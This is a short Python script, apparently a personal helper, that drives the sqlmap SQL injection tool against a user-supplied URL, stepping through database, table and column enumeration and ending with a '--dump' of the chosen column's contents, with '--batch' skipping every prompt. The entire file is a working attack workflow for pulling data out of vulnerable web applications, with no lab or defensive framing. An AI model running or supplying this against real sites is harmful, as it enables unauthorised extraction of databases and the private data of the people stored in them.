import subprocess

url = input("enter your url: ")

subprocess.call(["sqlmap", "-u", url , "--dbs", "--batch"])

database = input("enter your databse name: ")

subprocess.call(["sqlmap", "-u", url, "-D", database, "--tables", "--batch"])

tables_name = input("enter your tables name: ")

subprocess.call(["sqlmap", "-u", url, "-D", database, "-T", tables_name , "--columns", "--batch"])

columns_name = input("enter your coloums name: ")

subprocess.call(["sqlmap", "-u", url, "-D", database, "-T", tables_name, "-C", columns_name, "--dump", "--batch"])
sqlmap.py       
